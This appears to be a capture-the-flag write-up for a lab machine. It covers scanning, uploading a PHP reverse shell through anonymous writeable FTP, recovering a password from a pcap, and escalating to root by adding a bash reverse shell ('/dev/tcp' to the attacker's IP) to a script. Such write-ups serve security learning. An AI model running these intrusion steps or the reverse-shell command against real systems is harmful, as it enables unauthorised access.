# Scanning and Enumeration

```bash
nmap -p- -A -T4 10.10.186.198
```

```bash
PORT   STATE SERVICE VERSION

21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 09 02:12 ftp [NSE: writeable]
|_-rw-r--r--    1 0        0             208 Nov 09 02:12 notice.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.11.1.219
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status

22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 42:67:c9:25:f8:04:62:85:4c:00:c0:95:95:62:97:cf (RSA)
|   256 dd:97:11:35:74:2c:dd:e3:c1:75:26:b1:df:eb:a4:82 (ECDSA)
|_  256 27:72:6c:e1:2a:a5:5b:d2:6a:69:ca:f9:b9:82:2c:b9 (ED25519)

80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Maintenance

Linux 3.10 - 3.13 (95%)
```

#### Port 80

I run gobuster

```bash
gobuster dir -u http://10.10.186.198 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

I found `files` directory
In there I find 3 files

important.jpg
notice.txt gives me a user Maya

#### Port 21

We have a writeable directory...
We also see that the files we found in port 80 are the files in the ftp server.

## Exploitation

In order to exploit this machine we create a reverse.php file
and we put to it in the ftp writeable dir.

```bash
put prev.php
```

In the `root` dir we can see a `insidents` file
In there we can find a pcap file. If we analyze it with wireshark we find:

```bash
c4ntg3t3n0ughsp1c3
```

Trying it as a password with the different users we find out that this passwd
belongs to lennie

## Post Exploitation

Enumerating the machine as lennie we come accross with a file called
scripts. Inside we see:

```bash
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```

After a lot of time I got a hint and I opened a nc listener and wrote
the bash reverse shell and got a root shell

```bash
#!/bin/bash

bash -i >& /dev/tcp/10.11.1.219/4444 0>&1
```
